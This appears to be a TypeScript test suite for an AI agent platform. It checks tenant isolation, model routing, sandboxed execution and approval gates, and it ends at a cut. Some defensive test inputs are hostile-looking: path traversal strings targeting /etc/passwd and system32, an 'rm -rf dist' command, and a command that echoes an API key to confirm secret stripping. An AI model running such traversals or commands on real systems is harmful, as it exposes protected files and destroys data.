process.env.NODE_ENV = 'test';
process.env.CI = 'true';

import dotenv from 'dotenv';
dotenv.config();

// Ensure test environment mock credentials exist for deterministic CI pipeline runs
process.env.GEMINI_API_KEY = process.env.GEMINI_API_KEY || 'ci-test-mock-gemini-key';
process.env.OPENROUTER_API_KEY = 'ci-test-mock-openrouter-key';

import { describe, it, before, after } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import express from 'express';
import bcrypt from 'bcryptjs';
import { db } from '../src/server/db/database';
import { parseMermaid, renderDiagramToSvg } from '../src/components/diagrams/diagramParser';
import { modelCatalog } from '../src/server/providers/catalog';
import { modelRouter } from '../src/server/providers/router';
import { coworkEngine } from '../src/server/cowork/engine';
import { workspaceManager } from '../src/server/cowork/workspace-manager';
import { executionRunner } from '../src/server/cowork/execution-runner';
import { contextManager } from '../src/server/cowork/context-manager';
import { User, Conversation, Message, AgentTask, Workspace } from '../src/server/types';
import { performWebSearch, formatSearchAugmentation } from '../src/server/services/search';
import { detectWebDomain, generateDynamicWebHtml } from '../src/server/cowork/language-generators';
import { apiRouter } from '../src/server/routes/api';
import { generateTokens, verifyAccessToken, extractToken, authenticateRequest, authMiddleware, getJwtSecret, generateSecureRandomToken } from '../src/server/auth/auth';
import { validateDesktopCommand, executeSafeDesktopCommand, escapeHtml } from '../src/server/security/desktop-security';
import { containsDangerousXssVectors, sanitizeMarkdownContent, safeMarkdownSanitizeSchema } from '../src/lib/sanitizer';
import { isAllowedCorsOrigin, getCorsOptions } from '../src/server/security/cors-policy';
import { isValidGitBranchName, safeExecGit, safeExecGh, sanitizeCommitTitle } from '../src/server/security/git-security';
import {
  validateWorkspaceBindPath,
  canonicalizePath,
  isRootDirectory,
  SENSITIVE_DIR_NAMES,
} from '../src/server/security/path-validator';
import {
  validateUploadedFile,
  generateSafeUploadFilename,
  getUserUploadQuotaLimit,
  getUserUploadUsage,
  checkUserUploadQuota,
  getUploadsStaticOptions,
  PROHIBITED_EXTENSIONS,
} from '../src/server/security/upload-policy';
import cors from 'cors';
import {
  validateEndpointUrl,
  assertSafeEndpointUrl,
  isCloudMetadataIp,
  isLoopbackIp,
  isPrivateIp,
  isReservedOrMulticastIp,
  RESTRICTED_PORTS,
} from '../src/server/security/ssrf-validator';

describe('Cortex AI Automated Test Suite', () => {
  let testUser1: User;
  let testUser2: User;

  before(() => {
    testUser1 = db.createUser({
      id: `test_u1_${Date.now()}`,
      email: `u1_${Date.now()}@nexa.ai`,
      name: 'Test Engineer 1',
      passwordHash: bcrypt.hashSync('pass123', 8),
      role: 'user',
      createdAt: new Date().toISOString(),
    });

    testUser2 = db.createUser({
      id: `test_u2_${Date.now()}`,
      email: `u2_${Date.now()}@nexa.ai`,
      name: 'Test Engineer 2',
      passwordHash: bcrypt.hashSync('pass456', 8),
      role: 'user',
      createdAt: new Date().toISOString(),
    });
  });

  describe('1. Multi-Tenant Data Isolation', () => {
    it('prevents user 2 from reading user 1 conversations', () => {
      const conv = db.createConversation({
        id: `conv_${Date.now()}`,
        userId: testUser1.id,
        title: 'Secret Project Alpha',
        modelId: 'gemini-3.8-flash',
        providerId: 'gemini',
        mode: 'balanced',
        isPinned: false,
        isArchived: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      // User 1 can access
      const u1Access = db.getConversationById(conv.id, testUser1.id);
      assert.ok(u1Access, 'User 1 should be able to access own conversation');

      // User 2 CANNOT access
      const u2Access = db.getConversationById(conv.id, testUser2.id);
      assert.strictEqual(u2Access, undefined, 'User 2 must NOT access User 1 conversation');
    });

    it('prevents user 2 from adding messages to user 1 conversation', () => {
      const conv = db.createConversation({
        id: `conv_msgs_${Date.now()}`,
        userId: testUser1.id,
        title: 'User 1 Private Thread',
        modelId: 'gemini-3.8-flash',
        providerId: 'gemini',
        mode: 'balanced',
        isPinned: false,
        isArchived: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      assert.throws(() => {
        db.addMessage(
          {
            id: `msg_malicious_${Date.now()}`,
            conversationId: conv.id,
            role: 'user',
            content: 'Injected message',
            createdAt: new Date().toISOString(),
          },
          testUser2.id
        );
      }, /Unauthorized/);
    });

    it('updates user profile name and avatar correctly', () => {
      const updated = db.updateUser(testUser1.id, {
        name: 'Updated Name',
        avatar: 'data:image/webp;base64,sampleAvatarData',
      });

      assert.ok(updated, 'Updated user must be returned');
      assert.strictEqual(updated.name, 'Updated Name');
      assert.strictEqual(updated.avatar, 'data:image/webp;base64,sampleAvatarData');

      // Verify persistence in lookup
      const retrieved = db.getUserById(testUser1.id);
      assert.strictEqual(retrieved?.name, 'Updated Name');
      assert.strictEqual(retrieved?.avatar, 'data:image/webp;base64,sampleAvatarData');
    });
  });

  describe('2. Model Catalog & Free-First Routing', () => {
    it('returns normalized catalog with capabilities', () => {
      const models = modelCatalog.getModels();
      assert.ok(models.length >= 5, 'Should have multiple configured models');

      const gemini = models.find((m) => m.id === 'gemini-3.8-flash');
      assert.ok(gemini, 'Gemini 3.8 Flash must exist in catalog');
      assert.strictEqual(gemini?.isFree, true, 'Gemini 3.8 Flash must have free tier flag');
      assert.strictEqual(gemini?.capabilities.streaming, true);
    });

    it('prioritizes zero-cost models in Efficient mode by default', () => {
      const resolved = modelRouter.resolveModel({
        mode: 'efficient',
        forceFree: true,
        messages: [{ role: 'user', content: 'hello' }],
      });

      assert.ok(resolved.model, 'Must resolve a model');
      assert.strictEqual(resolved.model.isFree, true, 'Resolved model must be zero-cost');
      assert.strictEqual(resolved.model.mode, 'efficient');
    });

    it('rejects paid inference when forceFree is active and user selects paid model', () => {
      assert.throws(() => {
        modelRouter.resolveModel({
          requestedModelId: 'gemini-3.1-pro-preview',
          forceFree: true,
          allowPaidInference: false,
          messages: [{ role: 'user', content: 'test' }],
        });
      }, /paid inference model/);
    });

    it('includes local Ollama models in catalog with zero-cost flag and streaming capability', () => {
      const ollamaModel = modelCatalog.getModelById('ollama/qwen2.5-coder');
      assert.ok(ollamaModel, 'Qwen 2.5 Coder Ollama model must exist in catalog');
      assert.strictEqual(ollamaModel?.providerId, 'ollama');
      assert.strictEqual(ollamaModel?.isFree, true, 'Ollama model must be 100% free');
      assert.strictEqual(ollamaModel?.capabilities.streaming, true);

      const resolved = modelRouter.resolveModel({
        requestedModelId: 'ollama/qwen2.5-coder',
        forceFree: true,
        messages: [{ role: 'user', content: 'test code' }],
      });
      assert.strictEqual(resolved.model.id, 'ollama/qwen2.5-coder');
      assert.strictEqual(resolved.model.providerId, 'ollama');
    });
  });

  describe('3. Co-Work Engine & Bounded Tools', () => {
    it('creates workspace artifact and updates version safely', async () => {
      const ws = db.createWorkspace({
        id: `ws_test_${Date.now()}`,
        userId: testUser1.id,
        name: 'Test Sandbox',
        description: 'Co-Work testing space',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const createRes = await coworkEngine.executeTool(
        'workspace_create_artifact',
        {
          title: 'Config Map',
          fileName: 'config.json',
          language: 'json',
          content: '{"env": "test"}',
        },
        ws.id,
        testUser1.id
      );

      assert.strictEqual(createRes.success, true);
      assert.ok(createRes.artifactCreated);

      const artId = createRes.artifactCreated!.id;
      const readRes = await coworkEngine.executeTool(
        'workspace_read_file',
        { artifactId: artId },
        ws.id,
        testUser1.id
      );

      assert.strictEqual(readRes.success, true);
      assert.strictEqual(readRes.output?.content, '{"env": "test"}');
    });

    it('calculates unified diff correctly via code_diff_analyzer', async () => {
      const diffRes = await coworkEngine.executeTool(
        'code_diff_analyzer',
        {
          originalText: 'line 1\nline 2',
          modifiedText: 'line 1\nline 2 edited\nline 3',
        },
        'ws_dummy',
        testUser1.id
      );

      assert.strictEqual(diffRes.success, true);
      assert.ok(diffRes.output?.diff.includes('+ line 2 edited'));
    });
  });

  describe('4. Resilient Streaming & Timeout Safeguards', () => {
    it('persists partial streamed message in database when stream terminates prematurely', () => {
      const conv = db.createConversation({
        id: `conv_resilience_${Date.now()}`,
        userId: testUser1.id,
        title: 'Resilience Test Chat',
        modelId: 'gemini-3.8-flash',
        providerId: 'gemini',
        mode: 'balanced',
        isPinned: false,
        isArchived: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const partialContent = 'Here is the beginning of the generated solution...';
      const partialMsg = db.addMessage(
        {
          id: `msg_partial_${Date.now()}`,
          conversationId: conv.id,
          role: 'assistant',
          content: partialContent,
          modelUsed: 'gemini-3.8-flash',
          createdAt: new Date().toISOString(),
        },
        testUser1.id
      );

      assert.ok(partialMsg.id, 'Partial message must be saved');
      const retrieved = db.getMessages(conv.id, testUser1.id);
      const found = retrieved.find((m) => m.id === partialMsg.id);
      assert.ok(found, 'Partial message must be retrievable from conversation history');
      assert.strictEqual(found?.content, partialContent);
    });

    it('computes conversation token telemetry and context window footprint accurately', () => {
      const messages = [
        { role: 'user', content: 'What is the capital of France?' }, // ~8 tokens
        { role: 'assistant', content: 'The capital of France is Paris.' }, // ~8 tokens
      ];

      let promptTokens = 0;
      let completionTokens = 0;
      for (const m of messages) {
        const est = Math.max(1, Math.ceil(m.content.length / 4));
        if (m.role === 'user') promptTokens += est;
        else if (m.role === 'assistant') completionTokens += est;
      }

      const total = promptTokens + completionTokens;
      const contextWindowLimit = 1000000;
      const contextPercent = (total / contextWindowLimit) * 100;

      assert.ok(total > 0, 'Total tokens must be positive');
      assert.ok(promptTokens > 0, 'Prompt tokens must be positive');
      assert.ok(completionTokens > 0, 'Completion tokens must be positive');
      assert.ok(contextPercent < 1, 'Context percentage should be less than 1% for short chats');
    });
  });

  describe('5. Multi-Modal Vision Routing & Processing', () => {
    it('auto-switches text-only models to Gemini 3.8 Flash when image attachments are present', () => {
      const resolved = modelRouter.resolveModel({
        requestedModelId: 'nvidia/nemotron-3.5-lightning:free', // Text-only model (vision: false)
        messages: [{ role: 'user', content: 'Describe this diagram' }],
        attachments: [
          {
            id: 'att_sample_1',
            name: 'architecture.png',
            mimeType: 'image/png',
            url: '/uploads/architecture.png',
          },
        ],
      });

      assert.strictEqual(resolved.isFallback, true, 'Must trigger vision fallback');
      assert.strictEqual(resolved.model.id, 'gemini-3.8-flash', 'Must auto-route to Gemini 3.8 Flash');
      assert.strictEqual(resolved.model.capabilities.vision, true, 'Fallback model must support vision');
      assert.ok(resolved.fallbackReason?.includes('multi-modal vision analysis'));
    });

    it('keeps explicit vision model without fallback when image attachments are present', () => {
      const resolved = modelRouter.resolveModel({
        requestedModelId: 'gemini-3.8-flash',
        messages: [{ role: 'user', content: 'Analyze this photo' }],
        attachments: [
          {
            id: 'att_sample_2',
            name: 'photo.jpg',
            mimeType: 'image/jpeg',
            url: '/uploads/photo.jpg',
          },
        ],
      });

      assert.strictEqual(resolved.isFallback, false, 'Vision-enabled model should not trigger fallback');
      assert.strictEqual(resolved.model.id, 'gemini-3.8-flash');
      assert.strictEqual(resolved.model.capabilities.vision, true);
    });
  });

  describe('6. Real-Time Web Search & Citation Grounding', () => {
    it('formats search results into augmented prompt citations correctly', () => {
      const sampleResults = [
        {
          title: 'Official TypeScript Documentation',
          url: 'https://www.typescriptlang.org/docs/',
          snippet: 'TypeScript extends JavaScript by adding types to the language.',
        },
        {
          title: 'Node.js LTS Releases',
          url: 'https://nodejs.org/en/about/releases',
          snippet: 'Information on Node.js active, maintenance, and end-of-life releases.',
        },
      ];

      const formatted = formatSearchAugmentation(sampleResults);
      assert.ok(formatted.includes('LIVE WEB SEARCH RESULTS'));
      assert.ok(formatted.includes('[1] "Official TypeScript Documentation"'));
      assert.ok(formatted.includes('https://www.typescriptlang.org/docs/'));
      assert.ok(formatted.includes('[2] "Node.js LTS Releases"'));
      assert.ok(formatted.includes('[1](url)'));
    });

    it('returns empty string when no search results exist', () => {
      assert.strictEqual(formatSearchAugmentation([]), '');
    });
  });

  describe('7. Multi-Model Comparison & Context Regeneration', () => {
    it('accurately resolves preceding user prompt and attachments for multi-model regeneration', () => {
      const conv = db.createConversation({
        id: `conv_regen_${Date.now()}`,
        userId: testUser1.id,
        title: 'Model Comparison Chat',
        modelId: 'gemini-3.8-flash',
        providerId: 'gemini',
        mode: 'balanced',
        isPinned: false,
        isArchived: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const userMsg = db.addMessage(
        {
          id: `msg_user_prompt_${Date.now()}`,
          conversationId: conv.id,
          role: 'user',
          content: 'Compare QuickSort and MergeSort computational complexity.',
          createdAt: new Date().toISOString(),
        },
        testUser1.id
      );

      const asstMsg1 = db.addMessage(
        {
          id: `msg_asst_1_${Date.now()}`,
          conversationId: conv.id,
          role: 'assistant',
          content: 'QuickSort is O(n log n) average but O(n^2) worst case.',
          modelUsed: 'gemini-3.8-flash',
          createdAt: new Date().toISOString(),
        },
        testUser1.id
      );

      const allMessages = db.getMessages(conv.id, testUser1.id);
      const asstIndex = allMessages.findIndex((m) => m.id === asstMsg1.id);

      // Locate prior user prompt
      let resolvedPrompt = '';
      for (let i = asstIndex - 1; i >= 0; i--) {
        if (allMessages[i].role === 'user') {
          resolvedPrompt = allMessages[i].content;
          break;
        }
      }

      assert.strictEqual(resolvedPrompt, 'Compare QuickSort and MergeSort computational complexity.');

      // Simulate regenerated response from an alternate model
      const alternateModelId = 'meta-llama/llama-3.3-70b-instruct:free';
      const asstMsg2 = db.addMessage(
        {
          id: `msg_asst_2_${Date.now()}`,
          conversationId: conv.id,
          role: 'assistant',
          content: 'MergeSort is guaranteed O(n log n) time at the cost of O(n) auxiliary space.',
          modelUsed: alternateModelId,
          createdAt: new Date().toISOString(),
        },
        testUser1.id
      );

      const updatedHistory = db.getMessages(conv.id, testUser1.id);
      const assistantResponses = updatedHistory.filter((m) => m.role === 'assistant');
      assert.strictEqual(assistantResponses.length, 2, 'Both model responses should be captured for side-by-side comparison');
      assert.strictEqual(assistantResponses[0].modelUsed, 'gemini-3.8-flash');
      assert.strictEqual(assistantResponses[1].modelUsed, alternateModelId);
    });
  });

  describe('8. Sandboxed Code Execution Runner in Co-Work Workspace', () => {
    it('executes safe JavaScript code and captures stdout logs, return value, and execution metrics', async () => {
      const code = `
        const numbers = [1, 2, 3, 4, 5];
        const sum = numbers.reduce((a, b) => a + b, 0);
        console.log("Calculated sum:", sum);
        sum * 2;
      `;

      const result = await coworkEngine.executeTool(
        'code_execution_runner',
        { code, language: 'javascript', timeoutMs: 2000 },
        'ws_test',
        testUser1.id
      );

      assert.strictEqual(result.success, true);
      assert.ok(result.output);
      assert.strictEqual(result.output.language, 'javascript');
      assert.strictEqual(result.output.result, '30');
      assert.ok(Array.isArray(result.output.logs));
      assert.ok(result.output.logs.some((l: any) => l.text.includes('Calculated sum: 15')));
      assert.ok(typeof result.output.executionTimeMs === 'number');
    });

    it('traps runtime errors safely without crashing the host process', async () => {
      const code = `
        const x = undefinedVariable + 10;
      `;

      const result = await coworkEngine.executeTool(
        'code_execution_runner',
        { code, language: 'javascript', timeoutMs: 1000 },
        'ws_test',
        testUser1.id
      );

      assert.strictEqual(result.success, false);
      assert.ok(result.error?.includes('undefinedVariable is not defined'));
      assert.ok(result.output?.logs.some((l: any) => l.type === 'error'));
    });

    it('validates and pretty-prints JSON artifacts', async () => {
      const jsonStr = '{"service": "cortex", "active": true, "version": 1.5}';
      const result = await coworkEngine.executeTool(
        'code_execution_runner',
        { code: jsonStr, language: 'json' },
        'ws_test',
        testUser1.id
      );

      assert.strictEqual(result.success, true);
      assert.strictEqual(result.output?.valid, true);
      assert.ok(result.output?.result.includes('"service": "cortex"'));
    });

    it('simulates sandboxed execution for Python code artifacts', async () => {
      const pyCode = `
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(10))
      `;

      const result = await coworkEngine.executeTool(
        'code_execution_runner',
        { code: pyCode, language: 'python' },
        'ws_test',
        testUser1.id
      );

      assert.strictEqual(result.success, true);
      assert.strictEqual(result.output?.language, 'python');
      assert.ok(result.output?.logs.some((l: any) => l.text.includes('PYTHON')));
    });
  });

  describe('9. Production-Grade Repository-Aware AI Agent (Scenarios A through H)', () => {
    const testWsId = `ws_repo_test_${Date.now()}`;
    let testWs: any;

    before(() => {
      testWs = db.createWorkspace({
        id: testWsId,
        userId: testUser1.id,
        name: 'Repo Agent Verification Workspace',
        description: 'Target workspace for end-to-end repository agent tests.',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
    });

    it('Scenario A: Repository understanding without inventing files', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);

      // Create known project files
      await workspaceManager.createFile(wsRoot, 'src/auth/jwt.ts', 'export function verifyToken() { return true; }');
      await workspaceManager.createFile(wsRoot, 'package.json', JSON.stringify({ name: 'sample-project', scripts: { test: 'node --test' } }));

      const structure = await workspaceManager.getProjectStructure(wsRoot);
      assert.strictEqual(structure.hasTests, true);
      assert.strictEqual(structure.packageScripts.test, 'node --test');

      const search = await workspaceManager.searchContent(wsRoot, 'verifyToken');
      assert.ok(search.length >= 1);
      assert.strictEqual(search[0].file, 'src/auth/jwt.ts');
    });

    it('Scenario B: Multi-file coordinated implementation and atomic patches', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);

      // File 1: Middleware
      const f1 = await workspaceManager.createFile(
        wsRoot,
        'src/middleware/auth.ts',
        'export const requireAuth = (req: any, res: any, next: any) => next();'
      );
      assert.strictEqual(f1.success, true);

      // File 2: Route Protection
      const f2 = await workspaceManager.createFile(
        wsRoot,
        'src/routes/api.ts',
        'import { requireAuth } from "../middleware/auth";\nexport const router = {};'
      );
      assert.strictEqual(f2.success, true);

      // Apply targeted patch to Middleware
      const patch = await workspaceManager.applyPatch(
        wsRoot,
        'src/middleware/auth.ts',
        '',
        'next()',
        'req.user ? next() : res.status(401).send("Unauthorized")'
      );
      assert.strictEqual(patch.success, true);
      assert.ok(patch.diff.includes('+'));

      const verified = await workspaceManager.readFile(wsRoot, 'src/middleware/auth.ts');
      assert.ok(verified.content.includes('res.status(401)'));
    });

    it('Scenario C: Bug fixing and verification loop', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);

      // Create buggy code
      await workspaceManager.createFile(
        wsRoot,
        'src/math.ts',
        'export function calculateTax(amount: number) { return amount - 0.2; } // BUG: should be amount * 0.2'
      );

      // Apply fix
      const fix = await workspaceManager.applyPatch(
        wsRoot,
        'src/math.ts',
        '',
        'amount - 0.2',
        'amount * 0.2'
      );
      assert.strictEqual(fix.success, true);

      // Verify fix
      const verified = await workspaceManager.readFile(wsRoot, 'src/math.ts');
      assert.ok(verified.content.includes('amount * 0.2'));
    });

    it('Scenario D: Approval policy enforcement on server', () => {
      // Read-only tool -> low impact, no approval needed
      const readPolicy = coworkEngine.determineApprovalPolicy('workspace_read_file', { filePath: 'src/math.ts' });
      assert.strictEqual(readPolicy.requiresApproval, false);
      assert.strictEqual(readPolicy.impactLevel, 'low');

      // Destructive deletion -> high impact, requires approval
      const deletePolicy = coworkEngine.determineApprovalPolicy('workspace_delete_file', { filePath: 'important.ts' });
      assert.strictEqual(deletePolicy.requiresApproval, true);
      assert.strictEqual(deletePolicy.impactLevel, 'high');

      // Destructive shell execution -> high impact, requires approval
      const shellPolicy = coworkEngine.determineApprovalPolicy('terminal_execute_command', { command: 'rm -rf dist' });
      assert.strictEqual(shellPolicy.requiresApproval, true);
      assert.strictEqual(shellPolicy.impactLevel, 'high');
    });

    it('Scenario E: Tenant isolation and path traversal defense', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);

      // Attempt path traversal outside workspace root
      assert.throws(() => {
        workspaceManager.resolveSafePath(wsRoot, '../../etc/passwd');
      }, /Security Violation: Path traversal detected/);

      assert.throws(() => {
        workspaceManager.resolveSafePath(wsRoot, '..\\..\\windows\\system32');
      }, /Security Violation: Path traversal detected/);

      // Sensitive file filter (.env protection)
      assert.strictEqual(workspaceManager.isSensitiveFile('.env'), true);
      assert.strictEqual(workspaceManager.isSensitiveFile('.env.local'), true);
      assert.strictEqual(workspaceManager.isSensitiveFile('server.key'), true);
      assert.strictEqual(workspaceManager.isSensitiveFile('src/index.ts'), false);

      // User 2 cannot access User 1 workspace
      const user2Workspace = db.getWorkspaceById(testWs.id, testUser2.id);
      assert.strictEqual(user2Workspace, undefined, 'User 2 must not see User 1 workspace');
    });

    it('Scenario F: Sanitized command execution and timeout limits', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);

      // Verify command runs and stdout is captured
      const res = await executionRunner.executeCommand('node -e "console.log(process.env.GEMINI_API_KEY || \'SECRET_STRIPPED\')"', {
        cwd: wsRoot,
        timeoutMs: 5000,
      });

      assert.strictEqual(res.exitCode, 0);
      assert.ok(res.stdout.includes('SECRET_STRIPPED'), 'Server secrets must be stripped from child process');

      // Verify timeout enforcement kills process cleanly
      const timeoutRes = await executionRunner.executeCommand('node -e "setTimeout(() => {}, 5000)"', {
        cwd: wsRoot,
        timeoutMs: 400, // Trigger 400ms timeout
      });

      assert.strictEqual(timeoutRes.timedOut, true, 'Long running process must be timed out');
    });

    it('Scenario G: Interrupted execution state persistence and recovery', () => {
      const task = db.createTask({
        id: `task_recover_${Date.now()}`,
        workspaceId: testWs.id,
        userId: testUser1.id,
        title: 'Recovery Resilience Test',
        goal: 'Test crash recovery',
        status: 'running',
        modelId: 'gemini-3.8-flash',
        steps: [
          {
            id: 's1',
            title: 'Step 1',
            description: 'Inspect',
            status: 'completed',
            createdAt: new Date().toISOString(),
          },
          {
            id: 's2',
            title: 'Step 2',
            description: 'Modify',
            status: 'running',
            createdAt: new Date().toISOString(),
          },
        ],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      // Simulate worker restart / refresh
      const retrieved = db.getTaskById(task.id, testUser1.id);
      assert.ok(retrieved);
      assert.strictEqual(retrieved?.status, 'running');
      assert.strictEqual(retrieved?.steps[0].status, 'completed');
      assert.strictEqual(retrieved?.steps[1].status, 'running');
    });

    it('Scenario H: Backward compatibility with artifacts and existing features', async () => {
      // Existing artifact creation still works seamlessly
      const artResult = await coworkEngine.executeTool(
        'workspace_create_artifact',
        { title: 'Test Spec', fileName: 'spec.md', language: 'markdown', content: '# Backward Compatible' },
        testWs.id,
        testUser1.id
      );

      assert.strictEqual(artResult.success, true);
      assert.ok(artResult.artifactCreated?.id);

      // Existing code diff analyzer still works
      const diffResult = await coworkEngine.executeTool(
        'code_diff_analyzer',
        { originalText: 'line 1\nline 2', modifiedText: 'line 1\nline 2 edited' },
        testWs.id,
        testUser1.id
      );

      assert.strictEqual(diffResult.success, true);
      assert.ok(diffResult.output?.diff.includes('+ line 2 edited'));
    });
  });

  describe('11. Autonomous Agent Execution: Prompt Planning, Observe-Act-Verify, and Permission Gates', () => {
    let testWs: any;

    before(async () => {
      testWs = db.createWorkspace({
        id: `ws_agent_test_${Date.now()}`,
        userId: testUser1.id,
        name: 'Autonomous Agent Test Workspace',
        description: 'Verifies prompt parsing, observe-act-verify loop, and permission gates',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });
    });

    it('parses target files from user prompt goal and populates plannedFiles with operation tags', async () => {
      const task = db.createTask({
        id: `task_plan_test_${Date.now()}`,
        workspaceId: testWs.id,
        userId: testUser1.id,
        title: 'Prompt Analysis Goal Test',
        goal: 'Add JWT verification in src/auth.ts and create test in tests/auth.test.ts',
        status: 'planning',
        modelId: 'gemini-3.8-flash',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const steps = await coworkEngine.planTask(task, testUser1.id);
      assert.ok(steps.length >= 2, 'Should generate at least 2 structured steps');
      assert.ok(steps[0].operation, 'First step must have operation tagged');
      assert.ok(steps.some((s) => s.operation === 'create' || s.operation === 'edit'), 'Should plan file operations');

      // Check plannedFiles populated on task
      const updatedTask = db.getTaskById(task.id, testUser1.id);
      assert.ok(updatedTask?.plannedFiles && updatedTask.plannedFiles.length > 0, 'Planned files must be recorded');
      assert.ok(
        updatedTask.plannedFiles.some((f) => f.includes('auth.ts') || f.includes('solution.ts')),
        'Extracted target files must include parsed filenames'
      );
    });

    it('executes Observe-Act-Verify loop capturing pre-execution state and validating post-execution file', async () => {
      const wsRoot = workspaceManager.getWorkspaceRoot(testWs);
      const testFileName = `oav_test_${Date.now()}.ts`;

      const task = db.createTask({
        id: `task_oav_${Date.now()}`,
        workspaceId: testWs.id,
        userId: testUser1.id,
        title: 'Observe-Act-Verify Test Task',
        goal: `Create and update ${testFileName}`,
        status: 'running',
        permissionMode: 'session_edit', // Auto-run in Mode C for test
        modelId: 'gemini-3.8-flash',
        plannedFiles: [testFileName],
        steps: [
          {
            id: `s_create_${Date.now()}`,
            title: 'Create Test File',
            description: `Create initial ${testFileName}`,
            status: 'running',
            operation: 'create',
            targetPath: testFileName,
            tool: 'workspace_create_file',
            toolInput: {
              filePath: testFileName,
              content: 'export const status = "initial";\n',
            },
            createdAt: new Date().toISOString(),
          },
          {
            id: `s_edit_${Date.now()}`,
            title: 'Edit Test File',
            description: `Modify ${testFileName}`,
            status: 'pending',
            operation: 'edit',
            targetPath: testFileName,
            tool: 'workspace_edit_file',
            toolInput: {
              filePath: testFileName,
              content: 'export const status = "verified_modification";\n',
            },
            createdAt: new Date().toISOString(),
          },
        ],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      // Advance Step 1 (Creation): Observe -> Act -> Verify
      const step1Result = await coworkEngine.advanceTask(task.id, testUser1.id);
      const executedStep1 = step1Result.steps[0];

      assert.strictEqual(executedStep1.status, 'completed');
      assert.ok(executedStep1.toolOutput?.observation, 'Step 1 must record observation');
      assert.strictEqual(executedStep1.toolOutput.observation.preExisting, false, 'File must not exist before creation');
      assert.ok(executedStep1.toolOutput?.verification, 'Step 1 must record verification');
      assert.strictEqual(executedStep1.toolOutput.verification.verified, true, 'File creation must be verified on disk');
      assert.ok(executedStep1.toolOutput.verification.size > 0);

      // Advance Step 2 (Modification): Observe -> Act -> Verify
      const step2Result = await coworkEngine.advanceTask(task.id, testUser1.id);
      const executedStep2 = step2Result.steps[1];

      assert.strictEqual(executedStep2.status, 'completed');
      assert.ok(executedStep2.toolOutput?.observation, 'Step 2 must record observation');
      assert.strictEqual(executedStep2.toolOutput.observation.preExisting, true, 'File must exist before modification');
      assert.ok(executedStep2.toolOutput?.verification, 'Step 2 must record verification');
      assert.strictEqual(executedStep2.toolOutput.verification.verified, true, 'Modification must be verified on disk');

      // Final task state
      assert.strictEqual(step2Result.status, 'completed');
      assert.ok(step2Result.summary?.includes('verified'), 'Summary must report verified completion');

      // Clean up test file
      try {
        await workspaceManager.deleteFile(wsRoot, testFileName);
      } catch {}
    });

    it('enforces 3-tier permission modes A, B, and C accurately', () => {
      // Mode A: Ask for Every Change
      const policyModeA = coworkEngine.determineApprovalPolicy(
        'workspace_create_file',
        { filePath: 'src/config.ts' },
        { permissionMode: 'ask_every_change' }
      );
      assert.strictEqual(policyModeA.requiresApproval, true);
      assert.ok(policyModeA.reason.includes('Mode A'));

      // Mode B: Approve Complete Change Plan (Unapproved)
      const policyModeBUnapproved = coworkEngine.determineApprovalPolicy(
        'workspace_create_file',
        { filePath: 'src/config.ts' },
        { permissionMode: 'approve_plan', isPlanApproved: false }
      );
      assert.strictEqual(policyModeBUnapproved.requiresApproval, true);
      assert.ok(policyModeBUnapproved.reason.includes('requires developer approval'));

      // Mode B: Approved Plan with in-scope file
      const policyModeBApproved = coworkEngine.determineApprovalPolicy(
        'workspace_create_file',
        { filePath: 'src/config.ts' },
        { permissionMode: 'approve_plan', isPlanApproved: true, plannedFiles: ['src/config.ts'] }
      );
      assert.strictEqual(policyModeBApproved.requiresApproval, false);

      // Mode B: Approved Plan with out-of-scope expansion
      const policyModeBExpansion = coworkEngine.determineApprovalPolicy(
        'workspace_create_file',
        { filePath: 'unplanned/danger.ts' },
        { permissionMode: 'approve_plan', isPlanApproved: true, plannedFiles: ['src/config.ts'] }
      );
      assert.strictEqual(policyModeBExpansion.requiresApproval, true);
      assert.ok(policyModeBExpansion.reason.includes('Scope Expansion'));

      // Mode C: Session-Level Project Edit Permission
      const policyModeC = coworkEngine.determineApprovalPolicy(
        'workspace_edit_file',
        { filePath: 'src/config.ts' },
        { permissionMode: 'session_edit' }
      );
      assert.strictEqual(policyModeC.requiresApproval, false);

      // Mode C: High-impact destructive deletion still requires approval
      const policyModeCDelete = coworkEngine.determineApprovalPolicy(
        'workspace_delete_file',
        { filePath: 'src/config.ts' },
        { permissionMode: 'session_edit' }
      );
      assert.strictEqual(policyModeCDelete.requiresApproval, true);
    });

    it('enforces context window capability filter and safe margin budgeting formula', () => {
      const budget128 = contextManager.calculateBudget({
        modelId: 'gemini-3.8-flash',
        preference: '128k',
        systemPrompt: 'You are an autonomous engineering assistant.',
        toolCount: 15,
        usedTextContent: 'sample code content',
      });

      assert.strictEqual(budget128.effectiveLimit, 131072);
      const expectedAvailable =
        budget128.effectiveLimit -
        budget128.reservedOutputTokens -
        budget128.systemPromptTokens -
        budget128.toolDefinitionTokens -
        budget128.safetyMarginTokens;
      assert.strictEqual(budget128.availableInputTokens, expectedAvailable);
      assert.ok(budget128.utilizationPercent > 0);

      // Model capability filter: A 128k model cannot support 500k or 1m
      const options = contextManager.getValidOptionsForModel('meta-llama/llama-3.3-70b-instruct:free');
      const option1M = options.find((o) => o.id === '1m');
      if (option1M) {
        assert.strictEqual(option1M.disabled, true, '1M tokens must be disabled on 128k model');
      }
    });
  });

  describe('12. Claude Cowork End-to-End Workflow: Web Generation & Autonomous Loop', () => {
